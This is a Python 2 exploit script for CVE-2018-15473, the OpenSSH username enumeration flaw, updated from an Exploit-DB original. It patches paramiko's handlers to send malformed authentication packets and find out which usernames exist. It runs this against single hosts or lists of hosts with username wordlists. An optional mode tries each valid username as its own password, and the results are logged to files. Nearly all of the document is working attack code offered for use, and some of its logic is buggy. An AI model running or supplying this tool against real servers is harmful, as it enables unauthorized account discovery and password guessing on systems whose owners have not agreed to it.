# Exploit: OpenSSH 7.7 - Username Enumeration
# Original Author: Justin Gardner (https://www.exploit-db.com/exploits/45233/)
# Updated Version Author: Joe Black
# Date: 2018-10-31
# Software: https://ftp4.usa.openbsd.org/pub/OpenBSD/OpenSSH/openssh-7.7.tar.gz
# Affected Versions: OpenSSH version < 7.7
# CVE: CVE-2018-15473
# Version 1.4
 
###########################################################################
#                ____                    _____ _____ _    _               #
#               / __ \                  / ____/ ____| |  | |              #
#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #
#              | |  | | '_ \ / _ \ '_ \ \___ \\___ \|  __  |              #
#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #
#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #
#                     | |               Username Enumeration              #
#                     |_|                                                 #
#                                                                         #
###########################################################################

#!/usr/bin/env python
 
import argparse
import textwrap
import logging
import paramiko
import multiprocessing
import socket
import sys
import json
import os
import time
from datetime import datetime
startTime = datetime.now()
authcheck = False

dirName = 'SSHLoginData'
 
if not os.path.exists(dirName):
    os.mkdir(dirName)
    print "Directory " , dirName ,  " Created "

# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
old_parse_userauth_failure = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE]
 
# create custom exception
class BadUsername(Exception):
    def __init__(self):
		pass
 
# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass
 
# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()
 
# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result
 
# create function to perform authentication with malformed packet and desired username
def checkUsername(runArray, tried=0):
    
    username = runArray[2]
    host = runArray[0]
    port = runArray[1]
    sock = socket.socket()
    sock.connect((host, port))
    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            time.sleep(3)
            return checkUsername(runArray, tried)
        else:
            print '[-] Failed to negotiate SSH transport'
            return False
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
        return (False)
    # except paramiko.ssh_exception.SSHException:
        # return checkUsername(runArray)
    except paramiko.ssh_exception.AuthenticationException:
        out = False
        global authcheck
        if authcheck == True:
            out = sshAuth(host,port,username)
            paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
            paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
            if out == True:
                print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found and username successfully authenticated."
                saveFile(username, host, port, out)
            else:
                print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
                saveFile(username, host, port, out)
        else:
            saveFile(username, host, port, out)
            print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
        return (True)
    #Successful auth(?)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")

def checkauthtype(host, port):

    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = old_parse_service_accept
    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = old_parse_userauth_failure
    s = socket.socket()
    s.connect((host, port))
    checkauth = paramiko.Transport(s)
    checkauth.connect()
    try:
        checkauth.auth_none('')
        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
        paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
    except paramiko.BadAuthenticationType, err:
        global authcheck
        if "password" not in err.allowed_types:
            authcheck == False
            return host, port, False
        else:
            authcheck == True
            return host, port, True
            
def sshAuth(host,port,username, tried=0):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=username, allow_agent=False)
        ssh.close()
        return True
    except paramiko.ssh_exception.AuthenticationException:
        # print("Error: " + str(e))
        return False
    except paramiko.ssh_exception.SSHException:
            # server was likely flooded, retry up to 3 times
            if tried < 4:
                tried += 1
                time.sleep(3)
                return sshAuth(host,port,username, tried)
            else:
                print '[-] Failed to negotiate SSH transport. Trying next user.' 
                return False

def saveFile(username, host, port, out):
    outputFile = open("SSHLoginData/" + str(host) + ".txt", "a")
    if out == True:
        outputFile.writelines(datetime.now().strftime('%D %H:%M') + " - " +str(host) + ':' + str(port) + ' - ' + username + ' - Username authenticated successfully\n')
    else:
        outputFile.writelines(datetime.now().strftime('%D %H:%M') + " - " +str(host) + ':' + str(port) + ' - ' + username + '\n')
    outputFile.close()

def trySocket(host, port, tried=0):
    print "Testing host: " + host + ":" + str(port)
    sock = socket.socket()
    try:
        sock.settimeout(10)
        sock.connect((host, port))
        sock.close()
    except socket.error:
        print '[-] Connecting to host: ' + host + ' failed. Please check the specified host and port.'
        # sys.exit(1)
        return False, False
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        if tried < 4:
            tried += 1
            print '[-] SSH service might be flooded and is not responding. Waiting 10 seconds.' 
            time.sleep(3)
            return sshAuth(host,port,username, tried)
        else:
            print '[-] Failed to negotiate SSH transport. Trying next user.' 
            return False, False
    global authcheck
    if args.testcreds:
        host, port, authcheck = checkauthtype(host, port)
    return host, port
  
# assign functions to respective handlers

paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

# get rid of paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

arg_parser = argparse.ArgumentParser(
      formatter_class=argparse.RawDescriptionHelpFormatter,
      epilog=textwrap.dedent('''\
         additional information:
             I had some fun working on this script. The original author did an awesome job writing it but I wanted more functionality.
             Added the ability to use large lists of IPs along with pre-defined username lists. Also You can use the --testcreds flag to try valid usernames as username:password combos.
             Its a lot of crappy code. But It works fairly well and I feel good about this tool.\n
             New Additions:
                Added a check that verifies the SSH server accepts 'password' authentication and disables testcred if the server doesn't and is selected by user.
                Added timeout for SSH server thats not responding.
             
         '''))

arg_parser.add_argument('--hostname', type=str, help="A single hostname or IP address")
arg_parser.add_argument('--hostnameList',  type=str, help="List of SSH servers IP:PORT. One per line.")
arg_parser.add_argument('--port', type=int, default=22, help="A target port (default port 22)")
arg_parser.add_argument('--threads', type=int, default=5, help="The number of threads to be used (default 5 - most stable)")
arg_parser.add_argument('--testcreds', action='store_true', help="Connect to ssh and try valid username as both username and password")

group = arg_parser.add_mutually_exclusive_group(required=True)
group.add_argument('--username', type=str, help="A single username to validate")
group.add_argument('--userList', type=str, choices=['small', 'medium', 'large'], help="Small, medium, and large list of common usernames")
group.add_argument('--custuserList', type=str, help="A custom list of usernames (one per line) to enumerate through")

args = arg_parser.parse_args()
 
def run_line():
    try:

        if args.username: 
            if args.hostnameList:
                try:
                    f = open(args.hostnameList)
                except IOError:
                    print "[-] File doesn't exist or is unreadable."
                    sys.exit(3)
                    
                runArray = []    
                for lines in f:
                    if ":" in lines:
                        host = lines.split(':')
                        host, port = trySocket(host[0],int(host[1].strip()))
                        runArray.append([host, port, args.username])
                    # else:
                        # print "File is in wrong format. Should be IP:port on separate lines"
                pool = multiprocessing.Pool(args.threads)
                results = pool.map(checkUsername, runArray)

                if results[0] == False:
                    print "[-] Username " + args.username + " does not exist on " + str(args.hostname)
                print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
                
            elif args.hostname:
                runArray = []
                host, port = trySocket(args.hostname,args.port)
                if host == False:
                    sys.exit(1)
                runArray.append([args.hostname, args.port, args.username])
                pool = multiprocessing.Pool(args.threads)
                results = pool.map(checkUsername, runArray)
                if results[0] == False:
                    print "[-] Username " + args.username + " does not exist on " + str(args.hostname)
                print "Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime) + "\n"
                
        elif args.custuserList: #username list passed in
            if args.hostname:
                try:
                    f = open(args.custuserList)
                except IOError:
                    print "[-] File doesn't exist or is unreadable."
                    sys.exit(3)
                    
                runArray = []
                host, port = trySocket(args.hostname,args.port)
                if host == False:
                    sys.exit(1)
                for temp in f.readlines():
                   
                    runArray.append([args.hostname,args.port,temp.strip()])
                    
                f.close()
                pool = multiprocessing.Pool(args.threads)
                results = pool.map(checkUsername, runArray)
                print "Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime) + "\n"
            elif args.hostnameList:
                try:
                    f1 = open(args.hostnameList)
                except IOError:
                    print "[-] File doesn't exist or is unreadable."
                    sys.exit(3)
                    
                for lines in f1:
                    if ":" in lines:
                        host = lines.split(':')
                        host, port = trySocket(host[0],int(host[1].strip()))
                        if host != False:
                            try :                   
                                f2 = open(args.custuserList)
                            except IOError:
                                print "[-] File doesn't exist or is unreadable."
                                sys.exit(3)
                                
                            runArray = []
                            for temp in f2.readlines():
                                runArray.append([host,port,temp.strip()])
                                
                            f2.close()
                            pool = multiprocessing.Pool(args.threads)
                            results = pool.map(checkUsername, runArray)
                            print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
                        else:
                            continue
                    else:
                        print "File is in wrong format. Should be IP:port on separate lines"
        elif args.userList: #username list passed in
            if args.hostname:
                try:
                    if args.userList == "small":
                        f = open("small")
                    if args.userList == "medium":
                        f = open("medium")
                    if args.userList == "large":
                        f = open("large")
                except IOError:
                    print "[-] File doesn't exist or is unreadable."
                    sys.exit(3)
                runArray = []
                host, port = trySocket(args.hostname,args.port)
                if host == False:
                    sys.exit(1)
                for temp in f.readlines():
                    runArray.append([args.hostname,args.port,temp.strip()])
                f.close()
                pool = multiprocessing.Pool(args.threads)
                results = pool.map(checkUsername, runArray)
                print "Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime) + "\n"
                
            elif args.hostnameList:
                try:
                    f1 = open(args.hostnameList)
                except IOError:
                    print "[-] File doesn't exist or is unreadable."
                    sys.exit(3)
                    
                for lines in f1:
                    if ":" in lines:
                        host = lines.split(':')
                        host, port = trySocket(host[0],int(host[1].strip()))
                        if host != False:
                            try :                   
                                if args.userList == "small":
                                    f2 = open("small")
                                if args.userList == "medium":
                                    f2 = open("medium")
                                if args.userList == "large":
                                    f2 = open("large")
                            except IOError:
                                print "[-] File doesn't exist or is unreadable."
                                sys.exit(3)
                                
                            runArray = []
                            for temp in f2.readlines():
                                runArray.append([host,port,temp.strip()])
                                
                            f2.close()
                            pool = multiprocessing.Pool(args.threads)
                            results = pool.map(checkUsername, runArray)
                            print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
                        else:
                            continue
                    else:
                        print "File is in wrong format. Should be IP:port on separate lines"
        else: # no usernames passed in
            print "[-] No usernames provided to check"
            sys.exit(4)
            
    except Exception as e:
        print("Error: " + str(e))
        raise
    
if __name__ == "__main__":
    run_line()
